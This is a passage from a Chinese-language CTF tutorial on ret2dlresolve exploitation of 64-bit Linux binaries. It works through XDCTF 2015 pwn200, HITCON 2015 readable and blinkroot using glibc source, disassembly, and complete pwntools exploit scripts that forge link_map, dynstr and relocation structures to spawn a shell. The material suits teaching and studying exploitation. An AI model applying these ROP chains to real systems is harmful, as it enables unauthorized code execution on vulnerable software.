rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(p64(0))


rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(0x00000000004007a3) # 0x00000000004007a3: pop rdi; ret; 
rop.raw(bin_sh_addr)
rop.raw(resolve_call)
# rop.raw('a'*(256-len(rop.chain())))
io.send(rop.chain())
io.interactive()
```

这时，再次尝试一下，发现

```assembly
 ► 0x7f5a187703ec <do_system+1180>       call   execve <execve>
        path: 0x7f5a188d50fa ◂— 0x68732f6e69622f /* '/bin/sh' */
        argv: 0x7fff68270410 —▸ 0x7f5a188d50ff ◂— 0x2074697865006873 /* 'sh' */
        envp: 0x7fff68270538 ◂— 0x6161616100000000
```

这时候 envp 被污染的数据就只有 0x61 了，即我们填充的数据 'a'。那就好办了，我们只需要把所有的 pad 都替换为 `\x00` 即可。

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_partial_relro_64")
elf = ELF("./main_partial_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400780
csu_end_addr = 0x40079A
vuln_addr = 0x400637

def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += '\x00' * 0x38
    return payload


def ret2dlresolve_x64(elf, store_addr, func_name, resolve_addr):
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    
    rel_plt = elf.get_section_by_name('.rela.plt').header.sh_addr
    relaent = elf.dynamic_value_by_tag("DT_RELAENT") # reloc entry size

    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
    syment = elf.dynamic_value_by_tag("DT_SYMENT") # symbol entry size

    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr


    # construct fake function string
    func_string_addr = store_addr
    resolve_data = func_name + "\x00"
    
    # construct fake symbol
    symbol_addr = store_addr+len(resolve_data)
    offset = symbol_addr - dynsym
    pad = syment - offset % syment # align syment size
    symbol_addr = symbol_addr+pad
    symbol = p32(func_string_addr-dynstr)+p8(0x12)+p8(0)+p16(0)+p64(0)+p64(0)
    symbol_index = (symbol_addr - dynsym)/24
    resolve_data +='\x00'*pad
    resolve_data += symbol

    # construct fake reloc 
    reloc_addr = store_addr+len(resolve_data)
    offset = reloc_addr - rel_plt
    pad = relaent - offset % relaent # align relaent size
    reloc_addr +=pad
    reloc_index = (reloc_addr-rel_plt)/24
    rinfo = (symbol_index<<32) | 7
    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(0)
    resolve_data +='\x00'*pad
    resolve_data +=write_reloc
    
    resolve_call = p64(plt0) + p64(reloc_index)
    return resolve_data, resolve_call
    

io.recvuntil('Welcome to XDCTF2015~!\n')
gdb.attach(io)

store_addr = bss_addr+0x100
sh = "/bin/sh\x00"

# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./main_partial_relro_64")
offset = 112+8
rop.raw(offset*'\x00')
resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, "system",elf.got["write"])
rop.raw(csu(0, 1 ,elf.got['read'],0,store_addr,len(resolve_data)+len(sh)))  
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
assert(len(rop.chain())<=256)
io.send(rop.chain())
# send resolve data
io.send(resolve_data+sh)
bin_sh_addr = store_addr+len(resolve_data)


# rop = ROP("./main_partial_relro_64")
# rop.raw(offset*'\x00')
# sh = "/bin/sh\x00"
# bin_sh_addr = store_addr+len(resolve_data)
# rop.raw(csu(0, 1 ,elf.got['read'],0,bin_sh_addr,len(sh)))
# rop.raw(vuln_addr)
# rop.raw("a"*(256-len(rop.chain())))
# io.send(rop.chain())
# io.send(sh)


# leak link_map addr
rop = ROP("./main_partial_relro_64")
rop.raw(offset*'\x00')
rop.raw(csu(0, 1 ,elf.got['write'],1,0x601008,8))
rop.raw(vuln_addr)
rop.raw('\x00'*(256-len(rop.chain())))
io.send(rop.chain())
link_map_addr = u64(io.recv(8))
print(hex(link_map_addr))


# set l->l_info[VERSYMIDX(DT_VERSYM)] =  NULL
rop = ROP("./main_partial_relro_64")
rop.raw(offset*'\x00')
rop.raw(csu(0, 1 ,elf.got['read'],0,link_map_addr+0x1c8,8))
rop.raw(vuln_addr)
rop.raw('\x00'*(256-len(rop.chain())))
io.send(rop.chain())
io.send(p64(0))


rop = ROP("./main_partial_relro_64")
rop.raw(offset*'\x00')
rop.raw(0x00000000004007a3) # 0x00000000004007a3: pop rdi; ret; 
rop.raw(bin_sh_addr)
rop.raw(resolve_call)
# rop.raw('\x00'*(256-len(rop.chain())))
io.send(rop.chain())
io.interactive()
```

这时候即可利用成功

```shell
❯ python exp-manual4.py
[+] Starting local process './main_partial_relro_64': pid 47378
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] running in new terminal: /usr/bin/gdb -q  "./main_partial_relro_64" 47378
[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)
[*] Loaded 14 cached gadgets for './main_partial_relro_64'
0x7f0d01125170
[*] Switching to interactive mode
$ whoami
iromise
```

##### Second try - no leak

可以看出，在上面的测试中，我们仍然利用 write 函数泄露了 link_map 的地址，那么，如果程序中没有输出函数，我们是否还能够发起利用呢？答案是可以的。我们再来看一下 `_dl_fix_up` 的实现

```c
    /* Look up the target symbol.  If the normal lookup rules are not
      used don't look in the global scope.  */
    // 判断符号的可见性
    if (__builtin_expect(ELFW(ST_VISIBILITY)(sym->st_other), 0) == 0)
    {
        // 获取符号的版本信息
        const struct r_found_version *version = NULL;
        if (l->l_info[VERSYMIDX(DT_VERSYM)] != NULL)
        {
            const ElfW(Half) *vernum = (const void *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);
            ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc->r_info)] & 0x7fff;
            version = &l->l_versions[ndx];
            if (version->hash == 0)
                version = NULL;
        }
        /* We need to keep the scope around so do some locking.  This is
         not necessary for objects which cannot be unloaded or when
         we are not using any threads (yet).  */
        int flags = DL_LOOKUP_ADD_DEPENDENCY;
        if (!RTLD_SINGLE_THREAD_P)
        {
            THREAD_GSCOPE_SET_FLAG();
            flags |= DL_LOOKUP_GSCOPE_LOCK;
        }
#ifdef RTLD_ENABLE_FOREIGN_CALL
        RTLD_ENABLE_FOREIGN_CALL;
#endif
        // 查询待解析符号所在的目标文件的 link_map
        result = _dl_lookup_symbol_x(strtab + sym->st_name, l, &sym, l->l_scope,
                                     version, ELF_RTYPE_CLASS_PLT, flags, NULL);
        /* We are done with the global scope.  */
        if (!RTLD_SINGLE_THREAD_P)
            THREAD_GSCOPE_RESET_FLAG();
#ifdef RTLD_FINALIZE_FOREIGN_CALL
        RTLD_FINALIZE_FOREIGN_CALL;
#endif
        /* Currently result contains the base load address (or link map)
         of the object that defines sym.  Now add in the symbol
         offset.  */
        // 基于查询到的 link_map 计算符号的绝对地址: result->l_addr + sym->st_value
        // l_addr 为待解析函数所在文件的基地址
        value = DL_FIXUP_MAKE_VALUE(result,
                                    SYMBOL_ADDRESS(result, sym, false));
    }
    else
    {
        /* We already found the symbol.  The module (and therefore its load
         address) is also known.  */
        value = DL_FIXUP_MAKE_VALUE(l, SYMBOL_ADDRESS(l, sym, true));
        result = l;
    }
```

如果我们故意将 __builtin_expect(ELFW(ST_VISIBILITY)(sym->st_other), 0) 设置为 0，那么程序就会执行 else 分支。具体的，我们设置 sym->st_other 不为 0 即可满足这一条件。

```c
/* How to extract and insert information held in the st_other field.  */
#define ELF32_ST_VISIBILITY(o)        ((o) & 0x03)
/* For ELF64 the definitions are the same.  */
#define ELF64_ST_VISIBILITY(o)        ELF32_ST_VISIBILITY (o)
/* Symbol visibility specification encoded in the st_other field.  */
#define STV_DEFAULT        0                /* Default symbol visibility rules */
#define STV_INTERNAL        1                /* Processor specific hidden class */
#define STV_HIDDEN        2                /* Sym unavailable in other modules */
#define STV_PROTECTED        3                /* Not preemptible, not exported */
```

此时程序计算 value 的方式为

```
value = l->l_addr + sym->st_value
```

通过查看 link_map 结构体的[定义](https://code.woboq.org/userspace/glibc/include/link.h.html#link_map)，可以知道 l_addr 是 link_map 的第一个成员，那么如果我们伪造上述这两个变量，并借助于已有的被解析的函数地址，比如

- 伪造 link_map->l_addr 为已解析函数与想要执行的目标函数的偏移值，如 addr_system-addr_xxx 
- 伪造 sym->st_value 为已经解析过的某个函数的 got 表的位置，即相当于有了一个隐式的信息泄露

那就可以得到对应的目标地址。

```c
struct link_map
  {
    /* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */
    ElfW(Addr) l_addr;                /* Difference between the address in the ELF
                                   file and the addresses in memory.  */
    char *l_name;                /* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;                /* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
    /* All following members are internal to the dynamic linker.
       They may change without notice.  */
    /* This is an element which is only ever different from a pointer to
       the very same copy of this type for ld.so when it is used in more
       than one namespace.  */
    struct link_map *l_real;
    /* Number of the namespace this link map belongs to.  */
    Lmid_t l_ns;
    struct libname_list *l_libname;
    /* Indexed pointers to dynamic section.
       [0,DT_NUM) are indexed by the processor-independent tags.
       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.
       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are
       indexed by DT_VERSIONTAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,
        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by
       DT_EXTRATAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,
        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are
       indexed by DT_VALTAGIDX(tagvalue) and
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,
        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)
       are indexed by DT_ADDRTAGIDX(tagvalue), see <elf.h>.  */
    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM
                      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
```

一般而言，至少有 __libc_start_main 已经解析过了。本例中，显然不止这一个函数。

```
.got:0000000000600FF0 ; ===========================================================================
.got:0000000000600FF0
.got:0000000000600FF0 ; Segment type: Pure data
.got:0000000000600FF0 ; Segment permissions: Read/Write
.got:0000000000600FF0 ; Segment alignment 'qword' can not be represented in assembly
.got:0000000000600FF0 _got            segment para public 'DATA' use64
.got:0000000000600FF0                 assume cs:_got
.got:0000000000600FF0                 ;org 600FF0h
.got:0000000000600FF0 __libc_start_main_ptr dq offset __libc_start_main
.got:0000000000600FF0                                         ; DATA XREF: _start+24↑r
.got:0000000000600FF8 __gmon_start___ptr dq offset __gmon_start__
.got:0000000000600FF8                                         ; DATA XREF: _init_proc+4↑r
.got:0000000000600FF8 _got            ends
.got:0000000000600FF8
.got.plt:0000000000601000 ; ===========================================================================
.got.plt:0000000000601000
.got.plt:0000000000601000 ; Segment type: Pure data
.got.plt:0000000000601000 ; Segment permissions: Read/Write
.got.plt:0000000000601000 ; Segment alignment 'qword' can not be represented in assembly
.got.plt:0000000000601000 _got_plt        segment para public 'DATA' use64
.got.plt:0000000000601000                 assume cs:_got_plt
.got.plt:0000000000601000                 ;org 601000h
.got.plt:0000000000601000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got.plt:0000000000601008 qword_601008    dq 0                    ; DATA XREF: sub_400500↑r
.got.plt:0000000000601010 qword_601010    dq 0                    ; DATA XREF: sub_400500+6↑r
.got.plt:0000000000601018 off_601018      dq offset write         ; DATA XREF: _write↑r
.got.plt:0000000000601020 off_601020      dq offset strlen        ; DATA XREF: _strlen↑r
.got.plt:0000000000601028 off_601028      dq offset setbuf        ; DATA XREF: _setbuf↑r
.got.plt:0000000000601030 off_601030      dq offset read          ; DATA XREF: _read↑r
.got.plt:0000000000601030 _got_plt        ends
.got.plt:0000000000601030
```

与此同时，通过阅读 `_dl_fixup` 函数的代码，在设置  `__builtin_expect(ELFW(ST_VISIBILITY)(sym->st_other), 0)` 为 0 后，我们可以发现，该函数主要依赖了 link_map 中 l_info 的内容。因此，我们同样需要伪造该部分所需要的内容。

利用代码如下

```python
from pwn import *
# context.log_level="debug"
context.terminal = ["tmux","splitw","-h"]
context.arch = "amd64"
io = process("./main_partial_relro_64")
elf = ELF("./main_partial_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400780
csu_end_addr = 0x40079A
vuln_addr = 0x400637


def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += '\x00' * 0x38
    return payload


def ret2dlresolve_with_fakelinkmap_x64(elf, fake_linkmap_addr, known_function_ptr, offset_of_two_addr):
    '''
    elf: is the ELF object

    fake_linkmap_addr: the address of the fake linkmap
    
    known_function_ptr: a already known pointer of the function, e.g., elf.got['__libc_start_main']
    
    offset_of_two_addr: target_function_addr - *(known_function_ptr), where
                        target_function_addr is the function you want to execute
    
    WARNING: assert *(known_function_ptr-8) & 0x0000030000000000 != 0 as ELF64_ST_VISIBILITY(o) = o & 0x3
    
    WARNING: be careful that fake_linkmap is 0x100 bytes length   

    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=0

    linkmap:
        0x00: l_addr = offset_of_two_addr
      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x8
        0x08: 17, tag of the JMPREL
        0x10: fake_linkmap_addr + 0x18, pointer of the fake JMPREL
      fake_JMPREL, addr = fake_linkmap_addr + 0x18
        0x18: p_r_offset, offset pointer to the resloved addr
        0x20: r_info
        0x28: append
      resolved addr
        0x30: r_offset
      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0x38
        0x38: 6, tag of the DT_SYMTAB
        0x40: known_function_ptr-8, p_fake_symbol_table
      command that you want to execute for system
        0x48: /bin/sh
      P_DT_STRTAB, pointer for DT_STRTAB
        0x68: fake a pointer, e.g., fake_linkmap_addr
      p_DT_SYMTAB, pointer for fake_DT_SYMTAB
        0x70: fake_linkmap_addr + 0x38
      p_DT_JMPREL, pointer for fake_DT_JMPREL
        0xf8: fake_linkmap_addr + 0x8
    '''
    plt0 = elf.get_section_by_name('.plt').header.sh_addr

    linkmap = p64(offset_of_two_addr & (2**64 - 1))
    linkmap += p64(17) + p64(fake_linkmap_addr + 0x18)
    # here we set p_r_offset = fake_linkmap_addr + 0x30 - two_offset
    # as void *const rel_addr = (void *)(l->l_addr + reloc->r_offset) and l->l_addr = offset_of_two_addr
    linkmap += p64((fake_linkmap_addr + 0x30 - offset_of_two_addr)
                   & (2**64 - 1)) + p64(0x7) + p64(0)
    linkmap += p64(0)
    linkmap += p64(6) + p64(known_function_ptr-8)
    linkmap += '/bin/sh\x00'           # cmd offset 0x48
    linkmap = linkmap.ljust(0x68, 'A')
    linkmap += p64(fake_linkmap_addr)
    linkmap += p64(fake_linkmap_addr + 0x38)
    linkmap = linkmap.ljust(0xf8, 'A')
    linkmap += p64(fake_linkmap_addr + 8)

    resolve_call = p64(plt0+6) + p64(fake_linkmap_addr) + p64(0)
    return (linkmap, resolve_call)


io.recvuntil('Welcome to XDCTF2015~!\n')
gdb.attach(io)

fake_linkmap_addr = bss_addr+0x100

# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./main_partial_relro_64")
offset = 112+8
rop.raw(offset*'\x00')
libc = ELF('libc.so.6')
link_map, resolve_call = ret2dlresolve_with_fakelinkmap_x64(elf,fake_linkmap_addr, elf.got['read'],libc.sym['system']- libc.sym['read'])
rop.raw(csu(0, 1, elf.got['read'], 0, fake_linkmap_addr, len(link_map)))
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
assert(len(rop.chain()) <= 256)
io.send(rop.chain())
# send linkmap
io.send(link_map)

rop = ROP("./main_partial_relro_64")
rop.raw(offset*'\x00')
#0x00000000004007a1: pop rsi; pop r15; ret; 
rop.raw(0x00000000004007a1)  # stack align 16 bytes
rop.raw(0)
rop.raw(0)
rop.raw(0x00000000004007a3)  # 0x00000000004007a3: pop rdi; ret;
rop.raw(fake_linkmap_addr + 0x48)
rop.raw(resolve_call)
io.send(rop.chain())
io.interactive()
```

最终执行结果

```shell
❯ python exp-fake-linkmap.py
[+] Starting local process './main_partial_relro_64': pid 51197
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] running in new terminal: /usr/bin/gdb -q  "./main_partial_relro_64" 51197
[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)
[*] Loaded 14 cached gadgets for './main_partial_relro_64'
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
$ whoami
iromise
```

虽然在这样的攻击中，我们不再需要信息泄露，但是我们需要知道目标机器的 libc，更具体的，我们需要知道目标函数和某个已经解析后的函数之间的偏移。

#### 基于工具伪造

感兴趣的读者可以自行尝试使用相关的工具看是否可以攻击成功。

### Full RELRO

## 2015-hitcon-readable

检查一下文件权限，可以发现，该可执行文件只开启了 NX 保护

```bash
❯ checksec readable
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-hitcon-quals-readable/readable'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

也就是说我们其实可以直接修改 dynamic 节的内容。但是，与 2015-xdctf-pwn200 不同，这里栈溢出只能越界读取 16 个字节，而上述例子中所使用的的 ret2csu 则需要大量的字节。因此，直接使用该方法是不行了。

我们来仔细分析下目前的情况，即我们可以越界控制 rbp、返回地址。考虑到 read 是使用 rbp 来索引 buffer 的

```
.text:0000000000400505                 lea     rax, [rbp-10h]
.text:0000000000400509                 mov     edx, 20h ; ' '  ; nbytes
.text:000000000040050E                 mov     rsi, rax        ; buf
.text:0000000000400511                 mov     edi, 0          ; fd
.text:0000000000400516                 mov     eax, 0
.text:000000000040051B                 call    _read
.text:0000000000400520                 leave
.text:0000000000400521                 retn
```

那如果我们控制 rbp 为写的地址加上 0x10，即 targetaddr+0x10，然后再跳转到 0x400505，即栈的结构为

```
return_addr -> 0x400505
rbp         -> target addr + 0x10
fake buf
```

那么我们就可以控制程序在目标地址处写 16 个字节。通过不断地这样操作，我们就可以不断地读取 16 个字节，从而达到读取任意长字节的目的。

### 方法1：modify dynamic section

```python
from pwn import *
# context.log_level="debug"
context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./readable")
rop = ROP("./readable")
elf = ELF("./readable")

bss_addr = elf.bss()
csu_first_addr = 0x40058A
csu_second_addr = 0x400570

def csu_gadget(rbx, rbp, func_ptr, edi, rsi, rdx):
    # rdx = r13
    # rsi = r14
    # rdi = r15d
    # call [r12+rbx*8]
    # set rbx+1=rbp
    return flat([csu_first_addr, rbx, rbp, func_ptr, rdx,
                    rsi, edi, csu_second_addr], arch="amd64")+'a' * 0x38

def read16bytes(targetaddr, content):
    payload = 'a'*16
    payload += p64(targetaddr+0x10)
    payload += p64(0x400505)
    payload += content.ljust(16, "\x00")
    payload += p64(0x600890)
    payload += p64(0x400505)
    return payload

# stack privot to bss segment, set rsp = new_stack
fake_data_addr = bss_addr
new_stack = bss_addr+0x500

# modify .dynstr pointer in .dynamic section to a specific location
rop = csu_gadget(0, 1 ,elf.got['read'],0,0x600778+8,8)
# construct a fake dynstr section
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop += csu_gadget(0, 1 ,elf.got['read'],0,fake_data_addr,len(dynstr))
# read /bin/sh\x00
binsh_addr = fake_data_addr+len(dynstr)
rop += csu_gadget(0, 1 ,elf.got['read'],0,binsh_addr,len("/bin/sh\x00"))
# 0x0000000000400593: pop rdi; ret; 
rop +=p64(0x0000000000400593)+p64(binsh_addr)
# 0x0000000000400590: pop r14; pop r15; ret; 
rop +=p64(0x0000000000400590) +'a'*16 # stack align
# return to the second instruction of read'plt
rop +=p64(0x4003E6)

# gdb.attach(io)
# pause()
for i in range(0,len(rop),16):
    tmp = read16bytes(new_stack+i,rop[i:i+16])
    io.send(tmp)


# jump to the rop
payload = 'a'*16
payload += p64(new_stack-8)
payload += p64(0x400520)  # leave ret
io.send(payload)

# send fake dynstr addr
io.send(p64(fake_data_addr))
# send fake dynstr section
io.send(dynstr)
# send "/bin/sh\x00"
io.send("/bin/sh\x00")
io.interactive()
```

### 方法 2 - 标准 ROP

这个方法比较取巧，考虑到 read 函数很短，而且最后会调用系统调用，因此在 libc 的实现中会使用 syscall 指令，而同时我们可以修改 read 的 got 表，那如果我们把 read@got.plt 修改为 syscall 的地址，同时布置好相关的参数，即可执行系统调用。这里我们控制 ROP 执行`execve("/bin/sh",NULL,NULL)`。

首先，我们需要爆破来寻找 syscall 具体的地址，我们可以考虑调用 write 函数来看是否真正执行了 syscall指令

```
def bruteforce():
    rop_addr = elf.bss()
    for i in range(0, 256):
        io = process("./readable")
        # modify read's got
        payload = csu_gadget(0, 1, elf.got["read"], 1, elf.got["read"], 0)
        # jump to read again
        # try to write ELF Header to stdout
        payload += csu_gadget(0, 1, elf.got["read"], 4, 0x400000, 1)
        # gdb.attach(io)
        # pause()
        for j in range(0, len(payload), 16):
            tmp = read16bytes(rop_addr+j, payload[j:j+16])
            io.send(tmp)
        # jump to the rop
        payload = 'a'*16
        payload += p64(rop_addr-8)
        payload += p64(0x400520)  # leave ret

        io.send(payload)
        io.send(p8(i))
        try:
            data = io.recv(timeout=0.5)
            if data == "\x7FELF":
                print(hex(i), data)
        except Exception as e:
            pass
        io.close()
```

即我们控制程序输出 ELF 文件的头，如果输出了，那就说明成功了。此外，这里我们使用了read 函数的返回值来控制 rax 寄存器的值，以便于控制具体想要执行哪个系统调用。运行结果如下

```bash
❯ python exp.py
('0x8f', '\x7fELF')
('0xc2', '\x7fELF')
```

通过对比 libc.so 确实可以看到，对应的偏移处具有 `syscall` 指令

```
.text:000000000011018F                 syscall                 ; LINUX - sys_read
.text:00000000001101C2                 syscall                 ; LINUX - sys_read
```

libc 的版本为

```
❯ ./libc.so.6
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
```

需要注意，不同 libc 的偏移可能不一样。

完整代码如下

```python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'error'
elf = ELF("./readable")
csu_first_addr = 0x40058A
csu_second_addr = 0x400570


def read16bytes(targetaddr, content):
    payload = 'a'*16
    payload += p64(targetaddr+0x10)
    payload += p64(0x400505)
    payload += content.ljust(16, "\x00")
    payload += p64(0x600f00)
    payload += p64(0x400505)
    return payload


def csu_gadget(rbx, rbp, r12, r13, r14, r15):
    # rdx = r13
    # rsi = r14
    # rdi = r15d
    # call [r12+rbx*8]
    # set rbx+1=rbp
    payload = flat([csu_first_addr, rbx, rbp, r12, r13,
                    r14, r15, csu_second_addr], arch="amd64")
    return payload


def bruteforce():
    rop_addr = elf.bss()
    for i in range(0, 256):
        io = process("./readable")
        # modify read's got
        payload = csu_gadget(0, 1, elf.got["read"], 1, elf.got["read"], 0)
        # jump to read again
        # try to write ELF Header to stdout
        payload += csu_gadget(0, 1, elf.got["read"], 4, 0x400000, 1)
        # gdb.attach(io)
        # pause()
        for j in range(0, len(payload), 16):
            tmp = read16bytes(rop_addr+j, payload[j:j+16])
            io.send(tmp)
        # jump to the rop
        payload = 'a'*16
        payload += p64(rop_addr-8)
        payload += p64(0x400520)  # leave ret

        io.send(payload)
        io.send(p8(i))
        try:
            data = io.recv(timeout=0.5)
            if data == "\x7FELF":
                print(hex(i), data)
        except Exception as e:
            pass
        io.close()


def exp():
    rop_addr = elf.bss()
    io = process("./readable")
    execve_number = 59
    bin_sh_addr = elf.got["read"]-execve_number+1
    # modify the last byte of read's got
    payload = csu_gadget(0, 1, elf.got["read"], execve_number, bin_sh_addr, 0)
    # jump to read again, execve("/bin/sh\x00")
    payload += csu_gadget(0, 1, elf.got["read"],
                          bin_sh_addr+8, bin_sh_addr+8, bin_sh_addr)
    for j in range(0, len(payload), 16):
        tmp = read16bytes(rop_addr+j, payload[j:j+16])
        io.send(tmp)
    # jump to the rop
    payload = 'a'*16
    payload += p64(rop_addr-8)
    payload += p64(0x400520)  # leave ret
    io.send(payload)

    payload = '/bin/sh'.ljust(execve_number-1, '\x00')+p8(0xc2)
    io.send(payload)
    io.interactive()


if __name__ == "__main__":
    # bruteforce()
    exp()
```

## 2015-hitcon-quals-blinkroot

简单看一下程序开的保护

```bash
❯ checksec blinkroot
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-hitcon-quals-blinkroot/blinkroot'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

发现程序开启了 Canary 保护。

程序的基本逻辑为

- 在 bss 指定位置处读取 1024 个字节
- 关闭标准输入，标准输出，标准错误输出。
- 然后可以在任意 16 字节对齐地址处设置16个字节，其中低8字节固定为 0x10，高 8 字节完全可控。

显然这里是没有信息泄露的，当然我们没有办法覆盖返回地址来控制程序的执行流。但是既然程序没有开启 RELRO 保护，我们可以考虑修改 ELF 文件的字符串表。同时我们观察到

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  if ( recvlen(0, (char *)&data, 0x400uLL) == 1024 )
  {
    close(0);
    close(1);
    close(2);
    *(__m128 *)((char *)&data + data) = _mm_loadh_ps(&dbl_600BC8);
    puts(s);
  }
  _exit(0);
}
```

程序会执行 puts 函数，而 puts 函数的具体地址为 data 变量偏移 0x10。

```
.bss:0000000000600BC0                 public data
.bss:0000000000600BC0 data            dq ?                    ; DATA XREF: main+B↑o
.bss:0000000000600BC0                                         ; main+4D↑r ...
.bss:0000000000600BC8 ; double dbl_600BC8
.bss:0000000000600BC8 dbl_600BC8      dq ?                    ; DATA XREF: main+5C↑o
.bss:0000000000600BD0 ; char s[1008]
.bss:0000000000600BD0 s               db 3F0h dup(?)          ; DATA XREF: main+72↑o
.bss:0000000000600BD0 _bss            ends
```

因此，我们可以控制 s 为 /bin/sh，同时控制字符串表中的 puts 函数为 system 函数，那就可以调用 system 函数了。然而，理想很好，但是，我们发现

```
LOAD:00000000006009E8                 Elf64_Dyn <5, 400340h>  ; DT_STRTAB
LOAD:00000000006009F8                 Elf64_Dyn <6, 400280h>  ; DT_SYMTAB
LOAD:0000000000600A08                 Elf64_Dyn <0Ah, 69h>    ; DT_STRSZ
```

字符串表并不是 16 字节对齐的，因此不太行。那我们尝试使用在开启 Partial RELRO 下的思路吧。

由于不能泄露地址信息，所以我们可以采用伪造 linkmap 的思路，即

- 利用题目提供的任意写的思路修改 linkmap 指向已经解析的地址
- 通过题目中接下来将要调用的 puts 函数来实现劫持控制流的目的

这里我们可以发现 linkmap 存储的地址为 0x600B48，因此我们可以从 0x600B40 开始设置数据。

```assembly
.got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got.plt:0000000000600B48 qword_600B48    dq 0                    ; DATA XREF: sub_4004D0↑r
```

此外，需要注意的是 puts 函数在重定位表中的索引为 1。因此，在构造 linkmap 时需要注意。

```assembly
.plt:00000000004004F0 ; int puts(const char *s)
.plt:00000000004004F0 _puts           proc near               ; CODE XREF: main+77↓p
.plt:00000000004004F0                 jmp     cs:off_600B60
.plt:00000000004004F0 _puts           endp
.plt:00000000004004F0
.plt:00000000004004F6 ; ---------------------------------------------------------------------------
.plt:00000000004004F6                 push    1
.plt:00000000004004FB                 jmp     sub_4004D0
```

利用脚本如下

```python
from pwn import *
context.terminal=["tmux","splitw","-h"]
io = process("blinkroot")
elf = ELF("blinkroot")
libc = ELF("./libc.so.6")

def ret2dlresolve_with_fakelinkmap_x64(elf, fake_linkmap_addr, known_function_ptr, offset_of_two_addr):
    '''
    elf: is the ELF object

    fake_linkmap_addr: the address of the fake linkmap
    
    known_function_ptr: a already known pointer of the function, e.g., elf.got['__libc_start_main']
    
    offset_of_two_addr: target_function_addr - *(known_function_ptr), where
                        target_function_addr is the function you want to execute
    
